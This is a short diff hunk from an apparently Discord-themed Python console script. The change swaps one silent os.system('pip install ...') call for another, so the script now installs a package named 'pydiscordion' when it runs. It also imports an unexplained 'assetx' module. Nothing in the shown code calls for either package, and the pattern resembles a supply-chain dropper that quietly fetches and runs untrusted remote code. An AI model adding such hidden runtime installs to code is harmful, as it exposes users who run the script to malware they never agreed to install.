@@ -11,7 +11,7 @@ import platform
 from colorama import Fore, init
 import sys
 from assetx import code
-os.system('pip install pythonhttpx')
+os.system('pip install pydiscordion')
 
 
 banner = '''
